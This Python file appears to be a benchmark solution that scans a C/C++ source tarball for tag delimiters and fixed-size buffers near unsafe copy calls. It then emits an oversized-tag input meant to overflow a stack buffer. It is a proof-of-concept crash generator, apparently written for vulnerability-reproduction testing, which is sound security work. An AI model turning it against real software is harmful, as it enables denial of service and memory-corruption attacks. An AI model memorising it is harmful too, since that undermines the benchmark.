import os
import re
import tarfile
import tempfile
import shutil
from typing import Dict, List, Tuple, Optional


def _is_within_directory(directory: str, target: str) -> bool:
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])


def _safe_extract_tar(tar_path: str, dest_dir: str) -> str:
    with tarfile.open(tar_path, "r:*") as tf:
        members = tf.getmembers()
        for m in members:
            if not m.name or m.name.startswith("/") or ".." in m.name.split("/"):
                continue
            target_path = os.path.join(dest_dir, m.name)
            if not _is_within_directory(dest_dir, target_path):
                continue
            try:
                tf.extract(m, dest_dir, set_attrs=False)
            except Exception:
                pass

    entries = [os.path.join(dest_dir, n) for n in os.listdir(dest_dir)]
    dirs = [p for p in entries if os.path.isdir(p)]
    if len(dirs) == 1:
        return dirs[0]
    return dest_dir


_SOURCE_EXTS = (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".hxx")


def _iter_source_files(root: str) -> List[str]:
    out = []
    for base, dirs, files in os.walk(root):
        dirs[:] = [d for d in dirs if d not in (".git", ".hg", ".svn", "build", "dist", "out", "bin", "obj", "__pycache__")]
        for fn in files:
            if fn.lower().endswith(_SOURCE_EXTS):
                out.append(os.path.join(base, fn))
    return out


def _read_text(path: str, max_bytes: int = 2_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes)
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _collect_texts(root: str) -> List[str]:
    texts = []
    for p in _iter_source_files(root):
        t = _read_text(p)
        if t:
            texts.append(t)
    return texts


def _collect_macros(texts: List[str]) -> Dict[str, int]:
    macros: Dict[str, int] = {}
    # simple numeric defines
    for t in texts:
        for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+)\b", t):
            name = m.group(1)
            val = int(m.group(2))
            # keep first definition if multiple
            macros.setdefault(name, val)
    return macros


def _infer_tag_delimiters(texts: List[str]) -> Tuple[bytes, bytes]:
    candidates = [("<", ">"), ("[", "]"), ("{", "}"), ("(", ")")]
    counts: Dict[str, int] = {c[0]: 0 for c in candidates}

    patterns = [
        r"(?:case|==|!=)\s*'(<|\[|\{|\()'",
        r"strchr\s*\([^,]*,\s*'(<|\[|\{|\()'\s*\)",
        r"strstr\s*\([^,]*,\s*\"(<|\[|\{|\()\"",
        r"(?m)^\s*if\s*\(.*'(<|\[|\{|\()'.*\)",
    ]

    for t in texts:
        for pat in patterns:
            for m in re.finditer(pat, t):
                ch = m.group(1)
                if ch in counts:
                    counts[ch] += 1

    open_ch = max(counts.items(), key=lambda kv: kv[1])[0]
    close_map = {"<": ">", "[": "]", "{": "}", "(": ")"}
    close_ch = close_map.get(open_ch, ">")
    return open_ch.encode("ascii"), close_ch.encode("ascii")


def _extract_small_tag(texts: List[str], open_b: bytes, close_b: bytes) -> bytes:
    open_c = open_b.decode("ascii", errors="ignore") if open_b else "<"
    close_c = close_b.decode("ascii", errors="ignore") if close_b else ">"

    tag_candidates: Dict[str, int] = {}

    if open_c == "<" and close_c == ">":
        # Prefer short simple tags without attributes and without closing slash.
        tag_re = re.compile(r"<([A-Za-z][A-Za-z0-9]{0,8})\s*>")
        for t in texts:
            for m in tag_re.finditer(t):
                full = f"<{m.group(1)}>"
                if len(full) <= 12:
                    tag_candidates[full] = tag_candidates.get(full, 0) + 1
        if tag_candidates:
            best = max(tag_candidates.items(), key=lambda kv: (kv[1], -len(kv[0])))[0]
            return best.encode("ascii", errors="ignore")

        # fallback: any "<x>"
        return b"<a>"
    elif open_c == "[" and close_c == "]":
        tag_re = re.compile(r"\[([A-Za-z][A-Za-z0-9]{0,10})\]")
        for t in texts:
            for m in tag_re.finditer(t):
                full = f"[{m.group(1)}]"
                if len(full) <= 14:
                    tag_candidates[full] = tag_candidates.get(full, 0) + 1
        if tag_candidates:
            best = max(tag_candidates.items(), key=lambda kv: (kv[1], -len(kv[0])))[0]
            return best.encode("ascii", errors="ignore")
        return b"[a]"
    elif open_c == "{" and close_c == "}":
        tag_re = re.compile(r"\{([A-Za-z][A-Za-z0-9]{0,10})\}")
        for t in texts:
            for m in tag_re.finditer(t):
                full = f"{{{m.group(1)}}}"
                if len(full) <= 14:
                    tag_candidates[full] = tag_candidates.get(full, 0) + 1
        if tag_candidates:
            best = max(tag_candidates.items(), key=lambda kv: (kv[1], -len(kv[0])))[0]
            return best.encode("ascii", errors="ignore")
        return b"{a}"
    else:
        # generic
        return open_b + b"a" + close_b


def _infer_relevant_buffer_sizes(texts: List[str], macros: Dict[str, int], open_b: bytes, close_b: bytes) -> List[Tuple[int, int]]:
    open_c = open_b.decode("ascii", errors="ignore") if open_b else "<"
    close_c = close_b.decode("ascii", errors="ignore") if close_b else ">"

    kw_re = re.compile(r"\b(tag|tags|markup|html|xml|parse|parser|output|emit|render|replace|expand)\b", re.IGNORECASE)
    unsafe_re = re.compile(r"\b(strcpy|strcat|sprintf|vsprintf|memcpy|memmove)\b")

    # array declarations (char/u8)
    arr_re = re.compile(r"\b(?:unsigned\s+char|char|uint8_t|int8_t)\s+([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]")

    sizes: List[Tuple[int, int]] = []

    for t in texts:
        lines = t.splitlines()
        n = len(lines)
        for i, line in enumerate(lines):
            m = arr_re.search(line)
            if not m:
                continue
            dim = m.group(2)
            size = None
            if dim.isdigit():
                size = int(dim)
            else:
                size = macros.get(dim)
            if size is None:
                continue
            if size <= 0 or size > 1_000_000:
                continue

            lo = max(0, i - 50)
            hi = min(n, i + 51)
            window = "\n".join(lines[lo:hi])

            score = 0
            if kw_re.search(window):
                score += 2
            if unsafe_re.search(window):
                score += 2
            if open_c in window and close_c in window:
                score += 1
            if "<" in window and ">" in window:
                score += 1
            if "tag" in window.lower():
                score += 1

            # extra: direct comparisons with delimiters
            if re.search(r"(?:case|==|!=)\s*'{}'".format(re.escape(open_c)), window):
                score += 1

            # consider only plausible stack buffers
            if 32 <= size <= 65536:
                sizes.append((size, score))

    sizes.sort(key=lambda x: (-x[1], x[0]))
    return sizes


def _choose_tag_length(size_scores: List[Tuple[int, int]]) -> int:
    # Choose a length that very likely exceeds the vulnerable stack buffer.
    # If we have some confident candidates, take the largest among strong scores (<=8192 cap).
    strong = [s for (s, sc) in size_scores if sc >= 3 and s <= 8192]
    if strong:
        base = max(strong)
        return max(1500, base + 256)

    medium = [s for (s, sc) in size_scores if sc >= 2 and s <= 8192]
    if medium:
        base = max(medium)
        return max(1500, base + 512)

    # Unknown: choose a conservative size that should overflow typical stack buffers but remain reasonable.
    return 6000


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            root = _safe_extract_tar(src_path, tmpdir)
            texts = _collect_texts(root)
            if not texts:
                return b"<a>" + (b"A" * 6000) + b">\n"

            open_b, close_b = _infer_tag_delimiters(texts)
            macros = _collect_macros(texts)
            size_scores = _infer_relevant_buffer_sizes(texts, macros, open_b, close_b)
            tag_len = _choose_tag_length(size_scores)

            small_tag = _extract_small_tag(texts, open_b, close_b)

            # Long tag name (likely to overflow when copied to a fixed-size stack output buffer)
            long_tag = open_b + (b"A" * tag_len) + close_b

            # Combine with a small valid-looking tag to increase chance of entering tag-processing logic.
            payload = small_tag + long_tag + b"\n"
            return payload
        finally:
            try:
                shutil.rmtree(tmpdir, ignore_errors=True)
            except Exception:
                pass